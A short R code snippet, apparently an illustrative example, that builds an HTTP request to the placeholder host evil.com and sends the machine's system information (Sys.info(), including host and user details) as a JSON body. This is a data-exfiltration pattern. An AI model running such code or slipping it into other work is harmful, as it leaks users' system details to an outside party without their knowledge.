request("https://evil.com/evil") |>
  req_body_json(list(host = Sys.info())) |>
  req_perform()
